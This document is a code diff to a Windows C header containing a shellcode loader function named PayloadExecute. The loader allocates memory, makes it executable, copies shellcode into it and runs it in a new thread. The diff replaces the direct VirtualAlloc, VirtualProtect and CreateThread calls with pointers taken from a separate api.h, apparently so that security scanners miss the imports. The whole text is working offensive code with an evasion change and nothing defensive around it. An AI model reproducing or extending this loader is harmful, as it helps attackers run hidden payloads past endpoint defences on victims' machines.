@@ -1,4 +1,5 @@
 #pragma once
+#include "api.h"
 #include <stdio.h>
 #include <Windows.h>
 
@@ -11,19 +12,19 @@ BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN PBYTE pShellcodeAddress, IN 
 	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
 		return FALSE;
 
-	if (!(pAddress = (PBYTE)VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+	if (!(pAddress = (PBYTE)pVirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
 		return FALSE;
 	}
 
-	if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+	if (!pVirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
 		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
 		return FALSE;
 	}
 
 	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);
 
-	if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
+	if (!(hThread = pCreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
 		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
 		return FALSE;
 	}
